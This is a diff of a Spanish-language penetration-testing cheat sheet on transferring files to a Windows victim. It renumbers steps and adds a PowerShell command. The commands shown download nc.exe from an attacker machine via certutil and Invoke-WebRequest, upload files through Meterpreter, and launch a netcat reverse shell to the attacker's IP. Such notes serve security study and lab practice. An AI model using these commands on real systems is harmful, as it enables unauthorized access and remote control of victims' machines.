@@ -22,15 +22,17 @@ C:\Windows\Temp
 ```bash 
 # Victima Windows 
 
-1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir
+1 ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir
 
-2. ❯ certutil -urlcache -f http://IP/nc.exe nc.exe      # Descargar el payload de la maquina Linux
+2 ❯ certutil -urlcache -f http://IP/nc.exe nc.exe      # Descargar el payload de la maquina Linux
 	# IP = Direccion de la maquina de atacante Linux
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
 	
-3. ❯ certutil.exe -f -urlcache -split http://IP/nc.exe nc.exe   # Descargar el payload de la maquina Linux
+3 ❯ certutil.exe -f -urlcache -split http://IP/nc.exe nc.exe   # Descargar el payload de la maquina Linux
 	# IP = Direccion de la maquina de atacante Linux
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
+
+3 ❯ powershell -c "Invoke-WebRequest http://IP/nc.exe -OutFile nc.exe"   # Descargar el payload de la maquina Linux
 
 4 ❯ \\\\IP\smbFolder\nc.exe -e cmd IP 443      # Ejecutar una revershell con el binario 'Netcat'
 
